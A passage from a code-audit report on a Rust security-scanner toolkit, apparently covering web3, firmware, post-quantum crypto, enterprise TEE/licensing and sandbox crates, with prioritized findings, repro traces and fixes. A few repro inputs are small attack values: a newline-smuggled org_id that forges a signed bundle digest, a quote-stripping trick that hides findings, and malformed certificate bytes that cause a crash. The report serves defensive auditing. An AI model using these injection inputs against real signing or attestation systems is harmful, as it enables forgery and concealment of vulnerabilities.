- **Location:** `crates/smg-web3/src/svm_move.rs:128-260` (`collect_solana_file_context:128`, `walk_rust_solana:222`)
- **Root Cause:** `collect_solana_file_context` and `walk_rust_solana` recursively traverse every child node of the Rust AST without a recursion depth cap.
- **Minimal Repro / Trace:** Scanning a `.rs` file with deeply nested Rust blocks or expressions overflows the thread stack and crashes `smg-web3`.
- **Surgical Fix:** Thread `depth: usize` through `collect_solana_file_context` and `walk_rust_solana` and bail out safely when `depth >= 256`.

#### P1 — High-Impact Soundness / Accuracy / Coverage Bugs

##### [F5A-06] `P1` — Stateful REVM Invariant Campaign Never Funds `payable` Steps & Misses Deposit-Drain Violations
- **Location:** `crates/smg-web3/src/evm_oracle.rs:840, 874-930` (`replay_invariant_sequence:840`, `run_stateful_revm_invariant_campaign:919`)
- **Root Cause:** (1) `run_stateful_revm_invariant_campaign` hardcodes `value_wei: U256::ZERO` on every generated step, so `payable` deposit/mint functions never receive ETH. (2) `replay_invariant_sequence` only checks `current_bal < cfg.initial_contract_wei`, ignoring cumulative ETH deposited into the contract during the sequence—meaning an attacker draining all user deposits back down to `initial_contract_wei` is never flagged.
- **Surgical Fix:** Supply non-zero `value_wei` candidates for `payable` ABI functions (and track `expected_min_bal = initial_contract_wei + net_user_deposits` or compare attacker net profit > 0) when evaluating solvency invariants.

##### [F5A-07] `P1` — `probe_compiled_selector_unauth` Misses State-Zeroing Attacks & `probe_compiled_reentrancy_in_revm` Over-Claims Single Withdrawals
- **Location:** `crates/smg-web3/src/evm_oracle.rs:502-575, 596-650` (`probe_compiled_reentrancy_in_revm:567`, `probe_compiled_selector_unauth:645`)
- **Root Cause:** (1) `probe_compiled_selector_unauth` counts mutated storage slots with `v != U256::ZERO`, completely missing unauthorized state-zeroing exploits (e.g., calling an unprotected `renounceOwnership()` or resetting a balance/allowance to `0`). (2) `probe_compiled_reentrancy_in_revm` flags `profit > U256::ZERO` as proven reentrancy even when `deposit_sel.is_none()` and the contract was pre-funded—meaning a single non-reentrant withdrawal (like a faucet or unprotected withdraw) is misreported as a proven reentrancy exploit.
- **Surgical Fix:** (1) Snapshot pre-call storage values for touched slots and count `post_val != pre_val` regardless of whether `post_val == 0`. (2) In `probe_compiled_reentrancy_in_revm`, verify that the attacker's fallback/receive actually executed a nested reentrant call (e.g., via a storage counter or return-data flag in the attacker contract) before reporting proven reentrancy.

##### [F5A-08] `P1` — Solidity Storage Layout Mis-Sizing, Unbounded Array Recursion & Silent 128-Artifact Cap
- **Location:** `crates/smg-web3/src/context.rs:126-290, 449-475` (`solidity_type_byte_width_with_defs:126`, `pack_storage_vars_with_defs:181`, `parse_fixed_array_slots_with_defs:269`, `collect_json_artifacts:449, 456, 465`)
- **Root Cause:** (1) `solidity_type_byte_width_with_defs` classifies any type starting with `'I'` followed by an uppercase letter (e.g., `ItemStruct`, `Int256` alias) as a 20-byte `address` interface, corrupting slot packing. (2) `pack_storage_vars_with_defs` assumes every struct occupies 1 slot (32 bytes) instead of summing its packed fields, causing false positives/negatives in upgradeable storage-collision checks. (3) `parse_fixed_array_slots_with_defs` recurses on nested `[N]` dimensions without a depth cap. (4) `collect_json_artifacts` silently stops collecting at `out.len() >= 128` with no warning, dropping compiled artifacts in medium/large Foundry or Hardhat repositories.
- **Surgical Fix:** Resolve interfaces against parsed contract/interface declarations rather than an `I[A-Z]` heuristic; compute recursive struct slot counts with cycle detection; cap array nesting depth; raise/configure the artifact cap and emit a diagnostic warning if truncated.

##### [F5A-09] `P1` — Mathematically Unreachable ERC-7201 Proxy Check (`!p && p`) & UTF-8 NatSpec Lookback Failure
- **Location:** `crates/smg-web3/src/solidity.rs:754-758, 975-995, 1060-1080` (`extract_contract:975, 988`, `analyze_solidity_file_with_bases:1063`, NatSpec `lookback_start:754-756`)
- **Root Cause:** (1) `extract_contract` sets `has_erc7201_namespace = has_erc7201_struct && !is_proxy_like`, while `analyze_solidity_file_with_bases` later checks `if c.has_erc7201_namespace && c.is_proxy_like`—which is algebraically `(!p) && p == false`, making the entire ERC-7201 slot-0 collision check dead code. (2) The NatSpec lookback for `struct_declaration` computes `lookback_start = item_start.saturating_sub(512)` and calls `std::str::from_utf8(&src[lookback_start..item_start]).unwrap_or("")`; if `lookback_start` bisects a multi-byte UTF-8 character in comments, `from_utf8` fails and silently returns `""`, missing `@custom:storage-location erc7201:...` annotations.
- **Surgical Fix:** Set `has_erc7201_namespace = has_erc7201_struct` independently of `is_proxy_like`; advance `lookback_start` forward to the next UTF-8 char boundary (`while lookback_start < item_start && (src[lookback_start] & 0xC0) == 0x80 { lookback_start += 1; }`).

##### [F5A-10] `P1` — Solidity Auth, Reentrancy & `msg.value` Loop Soundness Bugs (Both FNs and FPs)
- **Location:** `crates/smg-web3/src/solidity.rs:155-180, 483-535, 1329-1400` (`classify_external_call:155, 167`, `has_caller_auth_tokens:483`, `modifier_is_auth_name:522`, `check_initializer_and_admin_access:1329`)
- **Root Cause:** (1) `has_caller_auth_tokens` treats `require(msg.sender != address(0))` as sufficient admin authorization, causing false negatives on unprotected privileged functions (`SMG-WEB3-ACCESS`). (2) `modifier_is_auth_name` matches any modifier containing `"only"` (e.g., `onlyWhenActive`, `onlyBeforeDeadline`, `onlyEOA`) as admin auth (FN). (3) `classify_external_call` flags `.send(...)` (`raw_fn.ends_with(".send")`) as a reentrancy callback risk even though its own comment notes 2300-gas `.send()` cannot reenter (FP). (4) `check_initializer_and_admin_access` flags `msg.value` reuse whenever a function has *any* loop and references `msg.value` *anywhere* in the function body, even outside the loop (FP).
- **Surgical Fix:** Exclude `msg.sender != address(0)` from auth recognition; restrict `modifier_is_auth_name` to explicit role/owner patterns (`onlyOwner`, `onlyAdmin`, `onlyRole`, `onlyGovernance`, `requiresAuth`, etc.); stop classifying `.send` as reentrancy-capable; check specifically whether `msg.value` is referenced *inside* a loop AST subtree.

##### [F5A-11] `P1` — Substring Bypass in `check_signature_replay` Suppresses Missing `ecrecover` Zero-Address & Nonce Checks
- **Location:** `crates/smg-web3/src/solidity.rs:1570-1610` (`check_signature_replay:1584-1585, 1594`)
- **Root Cause:** `check_signature_replay` suppresses the missing `signer != address(0)` finding if `body.contains("address(0)")` appears *anywhere* in the function (e.g., checking `to != address(0)` or `token != address(0)`), and suppresses the missing nonce replay protection finding if `low.contains("nonce")` appears anywhere (even in a comment or read-only parameter that is never incremented or marked used).
- **Surgical Fix:** Verify via AST that the recovered signer variable itself is compared against `address(0)`, and verify that a nonce/used-hash state variable is actually mutated (incremented or written to a mapping) in the function body.

##### [F5A-12] `P1` — Anchor `Program<` Field Suppresses Arbitrary CPI Detection on Unvalidated `AccountInfo` in Same Struct
- **Location:** `crates/smg-web3/src/svm_move.rs:64, 142, 378-395` (`collect_solana_file_context:142`, `structs_with_validated_program:378, 389`)
- **Root Cause:** Whenever an Anchor `#[derive(Accounts)]` struct contains *any* `Program<'info, ...>` field (which almost every real Anchor instruction struct has—e.g., `pub system_program: Program<'info, System>`), `collect_solana_file_context` inserts the entire struct name into `structs_with_validated_program`. This suppresses `CRITICAL` arbitrary-CPI alerts even when the same struct also exposes an unvalidated `pub target_program: AccountInfo<'info>` passed to `invoke()` / `invoke_signed()`.
- **Surgical Fix:** Track validated program *field names* per struct (`HashMap<String, HashSet<String>>`) and check whether the specific account argument passed into `invoke`/`invoke_signed` is a `Program<` field or has an explicit key check.

##### [F5A-13] `P1` — Move Analyzer Aborts Entire File on Any `#[test_only]` Attribute & Uses String-Blind Brace Counting
- **Location:** `crates/smg-web3/src/svm_move.rs:501-585, 726-740` (`analyze_move_file:501-502, 577-579`, `has_non_zero_bound:726, 737`)
- **Root Cause:** (1) `analyze_move_file` returns `Vec::new()` immediately if `source.contains("#[test_only]")` appears anywhere in the file—meaning a single `#[test_only]` helper at the bottom of a production Move module completely disables all security checks for the entire module (100% FN). (2) The manual `{`/`}` brace depth tracker ignores string/byte literals (`b"{"`), desynchronizing function boundaries. (3) `has_non_zero_bound` matches `== 0` anywhere in the function body rather than on the divisor expression.
- **Surgical Fix:** Skip only items/functions annotated with `#[test_only]` (not the entire file); skip string/byte literals and comments when tracking brace depth; bind non-zero checks to the actual divisor identifier.

##### [F5A-14] `P1` — `scan_web3_repo_with_options` Skips REVM Deep Audit for ERC-7201 Contracts & Overwrites Same-Named Contracts
- **Location:** `crates/smg-web3/src/lib.rs:79-165` (`scan_web3_repo_with_options:95, 102, 125, 137, 142`)
- **Root Cause:** (1) Inside the contract loop, an early `if c.has_erc7201_namespace { continue; }` at line `137` executes *before* the `if opts.deep_audit` REVM stateful invariant campaign block at line `142`, silently skipping all REVM invariant fuzzing for every ERC-7201 upgradeable contract. (2) `workspace_sol_bases` is keyed by bare `c.name` (`HashMap<String, ...>`), so when two files define contracts with the same name (common in monorepos/mocks/v1+v2), one silently overwrites the other's inheritance metadata.
- **Surgical Fix:** Move the `opts.deep_audit` REVM campaign check above the ERC-7201 storage-collision skip (or guard only the slot-collision check rather than `continue`ing the whole loop), and key `workspace_sol_bases` by `(canonical_path, c.name)` with import-aware resolution.

### 5A.3 Per-File Verdict Table (Form 5A)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-web3/src/lib.rs` | 819 | `FINDINGS: 1` | F5A-14 |
| `crates/smg-web3/src/context.rs` | 778 | `FINDINGS: 2` | F5A-03, F5A-08 |
| `crates/smg-web3/src/evm_oracle.rs` | 1,144 | `FINDINGS: 4` | F5A-01, F5A-02, F5A-06, F5A-07 |
| `crates/smg-web3/src/solidity.rs` | 1,947 | `FINDINGS: 4` | F5A-04, F5A-09, F5A-10, F5A-11 |
| `crates/smg-web3/src/svm_move.rs` | 759 | `FINDINGS: 3` | F5A-05, F5A-12, F5A-13 |
| **Total (Form 5A)** | **5,447** | **14 Unique Findings (5 P0 · 9 P1 · 0 P2 · 0 P3)** | |

---

## Form 5 (Session 5B) — Hardware/Firmware (`smg-hw`), Post-Quantum Crypto (`smg-pqc`) & Enterprise TEE/Licensing (`smg-enterprise`)

- **Scope:** 11 Rust source files across `crates/smg-hw/src/` (4 files, 4,728 LOC), `crates/smg-pqc/src/` (4 files, 1,906 LOC), and `crates/smg-enterprise/src/` (3 files, 1,103 LOC) — **7,737 LOC total** (100% read line 1 to EOF)
- **Totals:** **14 unique findings** — **5 P0**, **7 P1**, **2 P2**, **0 P3** (2 files `CLEAN`, 9 files with findings)

### 5B.1 Executive Summary

All 11 files in Form 5B (7,737 lines) were audited line-by-line across all 6 mandatory lenses.

- **Highest-Impact Risks:**
  1. **P0 Remote TEE Transcript-Binding Bypass & Fail-Open Loopback (`smg-enterprise/src/tee.rs:241-258, 308-436`):** `execute_remote_tee_scan` treats `quote.request_blake3_hex` and `quote.findings_blake3_hex` as optional (`if let Some(...)`), allowing a MITM or compromised proxy to strip/swap `body.findings` while keeping a valid Ed25519 quote with `None` hashes; `is_url_strictly_loopback` fails open (`return true`) if `localhost` DNS resolution errors.
  2. **P0 X.509 DER UTF-8 Slicing Panic & OID Shift Overflow (`smg-pqc/src/x509.rs:80-95, 126-136`):** `parse_asn1_time_year` slices `&s[..2]` / `&s[..4]` without UTF-8 char-boundary checks (panicking on multi-byte DER time bytes), and `decode_oid` shifts `cur << 7` with no overflow check while violating X.690 for `first >= 120`.
  3. **P0 Unbounded Recursion Stack-Overflow DoS (`smg-hw/src/context.rs:274-488`; `smg-hw/src/typestate_irq.rs:366-383`):** Both `eval_define_expr` (recursive descent on `#define` parens) and `collect_hw_functions` (tree-sitter AST walk) lack recursion depth caps.
  4. **P0 Airgapped Bundle Newline Delimiter Injection (`smg-enterprise/src/lib.rs:31-43, 85-122`):** `airgapped_bundle_signing_bytes` interpolates raw `org_id` and digests into `\n`-delimited text without rejecting `\n`/`\r` or length-prefixing, and `verify_airgapped_bundle_fail_closed` omits inverted/future `issued_at_unix` checks.
  5. **P1 Systemic Accuracy & Soundness Gaps:** `smg-pqc/src/inventory.rs` `FAST_STEMS` omits `"falcon"`, `"hqc"`, and `"blake3"` (making those CBOM patterns dead code); `smg-hw/src/domains.rs` misses 8/16-bit signed-to-unsigned wraparound (`int8_t`/`int16_t`); `smg-hw/src/typestate_irq.rs` initializes `then_returned: false` and computes `false && top.branch_returned` (permanently `false`), causing FP UAF after `if (err) { kfree(p); return; } else { ... }`.

### 5B.2 Findings (P0–P2)

#### P0 — Crash / Security / Soundness Break

##### [F5B-01] `P0` — Remote TEE Attestation Optional Transcript Binding Allows Findings Swapping + Fail-Open `localhost` & Payload OOM
- **Location:** `crates/smg-enterprise/src/tee.rs:241-258, 308-436` (`is_url_strictly_loopback:255`, `execute_remote_tee_scan:404-428`)
- **Root Cause:** (1) `execute_remote_tee_scan` only checks `request_blake3_hex` and `findings_blake3_hex` inside `if let Some(...)` blocks (lines `404` and `415`). Because `sign_tee_quote` sets both to `None` and the policy does not require them, a MITM or compromised gateway can replay/serve a valid signed quote with `None` transcript hashes while replacing `body.findings` with `[]` (completely hiding vulnerabilities!). (2) `is_url_strictly_loopback` returns `true` (fail-open) at line `255` when `(clean_host, port).to_socket_addrs()` returns `Err`. (3) Up to 256 files of 4 MiB each (1 GiB raw + JSON serialization) can be loaded into RAM with no aggregate byte budget.
- **Minimal Repro / Trace:** Return a valid Ed25519 `TeeAttestationQuote` with `request_blake3_hex: None, findings_blake3_hex: None` and `findings: []` -> `execute_remote_tee_scan` returns `Ok((session, empty_findings))`.
- **Surgical Fix:** Require `request_blake3_hex` and `findings_blake3_hex` to be `Some(...)` (fail-closed if absent), compare digests using `ct_eq_bytes`, return `false` on `to_socket_addrs()` error in `is_url_strictly_loopback`, and enforce a total aggregate payload cap (e.g., 32 MiB).

##### [F5B-02] `P0` — X.509 DER Parser Runtime UTF-8 Slicing Panic (`parse_asn1_time_year`) & `decode_oid` Shift Overflow / X.690 Bug
- **Location:** `crates/smg-pqc/src/x509.rs:80-95, 126-136` (`decode_oid:87`, `parse_asn1_time_year:130, 133`)
- **Root Cause:** (1) `parse_asn1_time_year` calls `std::str::from_utf8(bytes)` and then slices `&s[..2]` (line `130`) or `&s[..4]` (line `133`) without verifying ASCII or char boundaries—a malformed DER cert containing a multi-byte UTF-8 character (e.g., `"€"` = 3 bytes) in a `UTCTime` (`0x17`) or `GeneralizedTime` (`0x18`) TLV panics at runtime (`byte index 2 is not a char boundary`). (2) `decode_oid` computes `cur = (cur << 7) | ((b & 0x7f) as u64)` (line `87`) with no overflow check (panicking in debug or silently wrapping in release on >9-byte base-128 arcs), and computes `arc0 = first / 40; arc1 = first % 40;` which violates X.690 for `first >= 120` (where `arc0 = 2, arc1 = first - 80`).
- **Minimal Repro / Trace:** Feed a DER cert whose `notAfter` `UTCTime` bytes are `b"\xe2\x82\xac"` (`"€"`) -> `s.len() == 3 >= 2` -> `s[..2]` panics.
- **Surgical Fix:** Verify `bytes.is_ascii()` before slicing in `parse_asn1_time_year`; use `cur.checked_shl(7)` in `decode_oid` (returning `None` on overflow or trailing continuation bit) and decode `if first < 80 { (first / 40, first % 40) } else { (2, first - 80) }`.

##### [F5B-03] `P0` — Unbounded Recursive Descent Stack-Overflow DoS in `eval_define_expr`
- **Location:** `crates/smg-hw/src/context.rs:274-488` (`eval_define_expr`, `parse_atom:464`)
- **Root Cause:** `parse_bitor` -> `parse_bitand` -> `parse_shift` -> `parse_add` -> `parse_mul` -> `parse_atom` -> `Tok::LParen => parse_bitor` recurses without any nesting depth cap.
- **Minimal Repro / Trace:** A C header containing `#define X (((...1...)))` with 5,000 nested parentheses overflows the call stack during `ingest_firmware_context`.
- **Surgical Fix:** Thread `depth: usize` through the expression parser functions and return `None` when `depth > 64`.

##### [F5B-04] `P0` — Unbounded Tree-Sitter AST Recursion Stack-Overflow DoS in `collect_hw_functions`
- **Location:** `crates/smg-hw/src/typestate_irq.rs:366-383` (`collect_hw_functions`)
- **Root Cause:** `collect_hw_functions` recurses unconditionally through all AST children without a depth guard.
- **Minimal Repro / Trace:** A deeply nested C/C++/Rust file (e.g., nested `namespace` or `{ { ... } }` blocks) overflows the thread stack and crashes `smg-hw`.
- **Surgical Fix:** Add a `depth: usize` cap (`const MAX_AST_WALK_DEPTH: usize = 256;`) and return early when exceeded.

##### [F5B-05] `P0` — Airgapped Verification Bundle Newline Delimiter Injection & Missing `issued_at_unix` Sanity Checks
- **Location:** `crates/smg-enterprise/src/lib.rs:31-43, 72-122` (`airgapped_bundle_signing_bytes:31`, `ct_eq_bytes:72`, `verify_airgapped_bundle_fail_closed:85`)
- **Root Cause:** (1) `airgapped_bundle_signing_bytes` joins `org_id`, `report_blake3_digest`, and `binary_blake3` with raw `\n` delimiters and no field validation or length-prefixing—if an authority signs a bundle with an untrusted `org_id` containing `\nreport=...`, the resulting Ed25519 signature validates a forged report digest. (2) `verify_airgapped_bundle_fail_closed` does not reject `bundle.issued_at_unix > bundle.expires_at_unix` or future `issued_at_unix > now_unix + 300`, and duplicates `ct_eq_bytes` without `std::hint::black_box`.
- **Minimal Repro / Trace:** Sign `org_id = "acme\nreport=<forged>\nbin=<bin>\niss=1\nexp=9999999999"` and present a bundle with those split fields -> identical canonical signing bytes.
- **Surgical Fix:** Reject control characters (`\n`, `\r`) and validate strict hex digests in both `sign_airgapped_bundle` and `verify_airgapped_bundle_fail_closed` (or length-prefix fields), enforce `issued_at_unix <= expires_at_unix` and `issued_at_unix <= now_unix.saturating_add(300)`, and reuse `license::ct_eq_bytes`.

#### P1 — High-Impact Soundness / Accuracy / Coverage Bugs

##### [F5B-06] `P1` — `WrappedInterval` 8-Bit & 16-Bit Signed-Wraparound Blindspot & Sign-Extension Corruption
- **Location:** `crates/smg-hw/src/domains.rs:237-270, 323-366` (`from_u64_bounds:237`, `can_wrap_negative_to_large_size:323`, `signed_add:332`)
- **Root Cause:** (1) `can_wrap_negative_to_large_size` sets `high_bit_threshold = if width_bits == 32 { 1 << 31 } else { 1 << 63 }`. For `int8_t` (`width_bits == 8`, `umax == 255`) or `int16_t` / `short` (`width_bits == 16`, `umax == 65535`), `umax < (1 << 63)` is always true—so unchecked signed 8/16-bit lengths passed to `(size_t)len` completely bypass `SMG-HW-BOUNDS` wraparound detection (100% FN). (2) `from_u64_bounds` falls into the `else` branch for `width_bits == 8` / `16` when straddling `sign_bit`, setting `smin = i64::MIN, smax = i64::MAX`, and leaves `umin >= sign_bit` positive instead of sign-extending. (3) `signed_add` only checks 32-bit vs 64-bit overflow limits.
- **Surgical Fix:** Compute `high_bit_threshold = 1u64 << (width_bits.clamp(1, 64) - 1)` and exact signed min/max (`-(1i128 << (w-1))` .. `(1i128 << (w-1)) - 1`) generically for all widths `8, 16, 32, 64`.

##### [F5B-07] `P1` — `TypestateBranchFrame::then_returned` Permanently `false` (FP UAF on `if (...) { kfree; return; } else`) & Dead-Branch Interval Leak
- **Location:** `crates/smg-hw/src/typestate_irq.rs:1266, 1314-1326` (`analyze_single_hw_function`)
- **Root Cause:** (1) `TypestateBranchFrame` initializes `then_returned: false` (line `1343`), and on the `if -> else` transition executes `top.then_returned = top.then_returned && top.branch_returned;` (line `1266`). Because `false && x` is always `false`, `then_returned` can never become `true`—causing `if (err) { kfree(p); return -1; } else { p->x = 1; } p->y = 2;` to merge `Freed` from the dead `then` branch into fallthrough and emit a false-positive UAF. (2) At line `1314` (`else if frame.branch_returned`), `typestates` and `null_ptrs` are restored from `pre_if_*`, but `intervals`, `tnums`, and `positive_guards` are not—leaking assignments made inside dead early-return blocks into fallthrough.
- **Surgical Fix:** Set `top.then_returned = if top.then_states.is_none() { top.branch_returned } else { top.then_returned && top.branch_returned };` (checking `then_states.is_none()` before overwriting it), and restore `intervals`, `tnums`, and `positive_guards` on `else if frame.branch_returned`.

##### [F5B-08] `P1` — `SMG-HW-BOUNDS` Unrelated Stack-Array Fallback (FP) & `unique_name_idx` Dropping Duplicate `static` Helper Names (FN)
- **Location:** `crates/smg-hw/src/typestate_irq.rs:2080, 2305-2320` (`analyze_single_hw_function:2080`, `check_cross_fn_irq_deadlocks:2305`)
- **Root Cause:** (1) When determining `dst_cap_opt` for `memcpy(dst + off, src, len)`, `.or_else(|| local_caps.values().copied().min())` (line `2080`) falls back to the smallest unrelated stack array declared anywhere in the function (e.g., `uint8_t tag[16]`), falsely flagging valid copies into opaque `char *dst` pointers. (2) In `check_cross_fn_irq_deadlocks`, `unique_name_idx` (line `2305`) excludes any function whose name occurs more than once across the repository—silently disabling all inter-procedural ISR deadlock and sleeping-in-ISR propagation for common `static` driver helper names (`rx_push`, `tx_start`, `helper`) shared across `.c` files.
- **Surgical Fix:** Remove `.or_else(|| local_caps.values().copied().min())` so only the actual destination buffer identifier is matched; resolve callees first within the same `rel_path` (for `static` helpers) before falling back to unique cross-file symbols.

##### [F5B-09] `P1` — `FAST_STEMS` Omits `"falcon"`, `"hqc"`, and `"blake3"`, Making Those PQC CBOM Patterns Dead Code
- **Location:** `crates/smg-pqc/src/inventory.rs:82-106, 163-174` (`token_candidates_in_line`)
- **Root Cause:** `FAST_STEMS` short-circuits `token_candidates_in_line` to `Vec::new()` if none of its 19 stems appear in the line. None of `"falcon"`, `"hqc"`, or `"blake3"` match any stem in `FAST_STEMS`, so lines referencing `falcon-512`, `falcon-1024`, `hqc-128`, `hqc-192`, `hqc-256`, or `blake3` are silently skipped before reaching `patterns` (lines `163-174`), omitting them from the CycloneDX CBOM and category checks.
- **Surgical Fix:** Add `"falcon"`, `"hqc"`, and `"blake3"` to `FAST_STEMS` and add a unit test asserting they appear in `res.assets` and `res.cbom_json`.

##### [F5B-10] `P1` — `inventory.rs` Unindented-Only Function Chunking & File-Wide `X25519` Hybrid Suppression
- **Location:** `crates/smg-pqc/src/inventory.rs:256-268, 473, 559` (`check_pqc_hybrid_and_downgrade:256`, `analyze_pqc_inventory:473, 559`)
- **Root Cause:** (1) `fn_chunks` rejects indented function headers (`!line.starts_with("    ") && !line.starts_with('\t')`), failing to isolate Rust `impl` methods or Python/JS/TS/Java class methods during hybrid KDF checks. (2) `file_implements_mlkem_hybrid` (line `473`) suppresses `SMG-PQC-HNDL`/`SMG-PQC-SHOR` for *every* `X25519` usage in the entire file (line `559`), even in completely separate classical-only functions.
- **Surgical Fix:** Allow indented method declarations when splitting `fn_chunks` and scope the hybrid `X25519` exemption to the enclosing function/struct rather than the whole file.

##### [F5B-11] `P1` — X.509 Analyzer Hardcodes Year `2026`, Ignores Leaf `SubjectPublicKeyInfo` & Over-Flags `is_ca`
- **Location:** `crates/smg-pqc/src/x509.rs:138-196` (`parse_x509_der:187, 191`)
- **Root Cause:** (1) `let current_year = 2026u32;` (line `191`) is hardcoded instead of reading the current system clock, permanently drifting Mosca HNDL `remaining_years`. (2) `parse_x509_der` checks only `signatureAlgorithm` (`sig_oid`) and never parses `subjectPublicKeyInfo`, missing Shor-vulnerable RSA/ECDSA leaf public keys signed by a PQC CA. (3) `is_ca` (line `187`) checks whether `[0x55, 0x1d, 0x13]` and `[0x01, 0x01, 0xff]` appear *anywhere* independently in `after_validity`, falsely marking any non-CA cert that has `BasicConstraints CA:FALSE` plus any other `critical: TRUE` (`01 01 ff`) extension as a CA.
- **Surgical Fix:** Derive `current_year` from `SystemTime::now()`; parse `subjectPublicKeyInfo.algorithm.algorithm` OID alongside `sig_oid`; parse `BasicConstraints` extension TLV structure to check the `cA BOOLEAN` strictly inside its `extnValue`.

##### [F5B-12] `P1` — `scan_pqc_repo` Scans Test-Fixture Certificates & Ignores Binary `.der` Certificates
- **Location:** `crates/smg-pqc/src/lib.rs:20-49` (`scan_pqc_repo`)
- **Root Cause:** Unlike `analyze_pqc_inventory`, the certificate loop in `scan_pqc_repo` never calls `smg_core::is_test_source_path(&f.rel_path)`, emitting `HIGH` `SMG-PQC-HNDL` false positives on test fixture certificates (e.g., `tests/fixtures/rsa_cert.pem`). It also ignores raw binary `.der` files even though `parse_x509_der` already exists.
- **Surgical Fix:** Skip `smg_core::is_test_source_path(&f.rel_path)` for certificate files and support `.der` binary files via `parse_x509_der`.

#### P2 — Moderate / Precision / Completeness

##### [F5B-13] `P2` — `eval_linker_expr` Strips Parentheses Ignoring Precedence & SVD `derivedFrom` Only Resolves 1 Hop
- **Location:** `crates/smg-hw/src/context.rs:137-184, 631-660` (`eval_linker_expr:137`, `parse_linker_or_svd_regions:631`)
- **Root Cause:** `eval_linker_expr` discards inner `(` and `)` characters (`else if ch != '(' && ch != ')'`), evaluating `128K - (64K - 16K)` left-to-right as `48K` instead of `80K`. In SVD parsing, `derivedFrom` performs a single-hop map lookup, so multi-level peripheral inheritance (`C -> B -> A`) loses parent size and `read-only` access.
- **Surgical Fix:** Reuse a bounded precedence-aware expression evaluator in `eval_linker_expr` and follow `derivedFrom` chains with a visited set up to depth 8.

##### [F5B-14] `P2` — `lattice.rs` Omits Underscore PQC Names, Collapses `RS384`/`RS512` to `RS256` & Overstates Hybrid Classical Bits
- **Location:** `crates/smg-pqc/src/lattice.rs:40-65, 138-155, 313-325` (`evaluate_pq_strength`)
- **Root Cause:** Direct calls to `evaluate_pq_strength("ml_kem_768")` or `"ml_dsa_65"` return `None` because only hyphenated/concatenated forms are matched; `RS384`/`RS512` both return canonical `"RS256"` (corrupting CBOM fidelity); `X25519MLKEM768` and `SecP256r1MLKEM768` report `classical_bits: 192` despite their classical halves (X25519 / P-256) providing 128-bit classical security.
- **Surgical Fix:** Normalize `_` to `-` in `evaluate_pq_strength`, emit distinct canonical names/OIDs for `RS384`/`RS512`, and set `classical_bits: 128` for X25519/P-256 hybrids (or document combined classical+PQ security explicitly).

### 5B.3 Per-File Verdict Table (Form 5B) & Form 5 Rollup

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-hw/src/lib.rs` | 595 | `CLEAN — verified line-by-line` | — |
| `crates/smg-hw/src/context.rs` | 1,028 | `FINDINGS: 2` | F5B-03, F5B-13 |
| `crates/smg-hw/src/domains.rs` | 611 | `FINDINGS: 1` | F5B-06 |
| `crates/smg-hw/src/typestate_irq.rs` | 2,494 | `FINDINGS: 3` | F5B-04, F5B-07, F5B-08 |
| `crates/smg-pqc/src/lib.rs` | 329 | `FINDINGS: 1` | F5B-12 |
| `crates/smg-pqc/src/inventory.rs` | 776 | `FINDINGS: 2` | F5B-09, F5B-10 |
| `crates/smg-pqc/src/lattice.rs` | 509 | `FINDINGS: 1` | F5B-14 |
| `crates/smg-pqc/src/x509.rs` | 292 | `FINDINGS: 2` | F5B-02, F5B-11 |
| `crates/smg-enterprise/src/lib.rs` | 277 | `FINDINGS: 1` | F5B-05 |
| `crates/smg-enterprise/src/license.rs` | 315 | `CLEAN — verified line-by-line` | — |
| `crates/smg-enterprise/src/tee.rs` | 511 | `FINDINGS: 1` | F5B-01 |
| **Total (Form 5B)** | **7,737** | **14 Unique Findings (5 P0 · 7 P1 · 2 P2 · 0 P3)** | |
| **Form 5 Combined (16 files)** | **13,184** | **28 Unique Findings (10 P0 · 16 P1 · 2 P2 · 0 P3)** | |

---

## Form 6 — Isolated OS Sandbox, Dynamic Protocol Verification & AI/CEGIS Patch Synthesis (`crates/smg-sandbox` & `crates/smg-ai`)

- **Scope:** 6 Rust source files across `crates/smg-sandbox/src/` (4 files, 5,759 LOC) and `crates/smg-ai/src/` (2 files, 2,033 LOC) — **7,792 LOC total** (100% read line 1 to EOF)
- **Totals:** **10 unique findings** — **4 P0**, **6 P1**, **0 P2**, **0 P3** (0 files `CLEAN`, 6 files with findings)

### 6.1 Executive Summary

All 6 files in Form 6 (7,792 lines) were audited line-by-line across all 6 mandatory lenses.

- **Highest-Impact Risks:**
  1. **P0 WSL2 Shell-Quoting Bug & macOS Seatbelt OOB Port Mismatch (`smg-sandbox/src/bwrap.rs:631, 1123-1205`):** `run_wsl_bwrap_netns` interpolates `wsl_root`, `wsl_cfg`, `wsl_finding`, and `boot_cmd` into a `sh -c` command string without proper single-quote escaping for paths and inside double-quoted shell expansion for `boot_cmd`; on macOS Seatbelt, `execute_in_isolated_netns` allowlists `port + 2` for `OobSsrfCatcher`, whereas `OobSsrfCatcher::spawn` binds an OS-assigned ephemeral port (`0`), causing Seatbelt to block the callback listener.
  2. **P0 Unrouted Dynamic Protocol Verifiers & Missing TLS / CRLF Sanitization (`smg-sandbox/src/lib.rs:29-37`; `smg-sandbox/src/verifier.rs:1010-1283`):** `is_dynamic_probe_target` omits `SMG-OAUTH-*`, `SMG-CSRF-*`, `SMG-REDIRECT-*`, and `SMG-API-*` (GraphQL/WS) rules, so they bypass the isolated sandbox container and probe an unbooted host port; `send_raw_protocol_probe` ignores `cfg.use_tls` (always plain TCP) and does not strip control characters (`\r`/`\n`) from `raw_path`.
  3. **P0 Broken-Symlink Crash & `node_modules` Copy Blowup (`smg-ai/src/lib.rs:44-110, 896-925`):** `copy_dir_recursive_filtered` calls `entry.metadata()` (following symlinks) *before* checking `entry.file_type()?.is_symlink()`, aborting `--apply-check` and CEGIS on any broken symlink, and does not exclude `node_modules`/`.venv` (copying gigabytes per iteration); `build_minimal_patch_prompt` can exceed `MAX_PROMPT_BYTES` (2048 B) by up to 29 bytes on truncation and emits no code context when `witness_path` is empty.
  4. **P0 Non-Feedback CEGIS Loop (`smg-ai/src/codemods.rs:321-445`):** `run_cegis_patch_loop` collects `last_feedback` (syntax or verification failures) across iterations 1..3 but never passes it into `generate_patch_plan`, so iterations 2 and 3 resend the exact same prompt with zero counterexample guidance.

### 6.2 Findings (P0–P1)

#### P0 — Crash / Security / Soundness Break

##### [F6-01] `P0` — WSL2 `bwrap` Shell-Quoting Command-Injection Risk & macOS Seatbelt Ephemeral OOB Port Mismatch
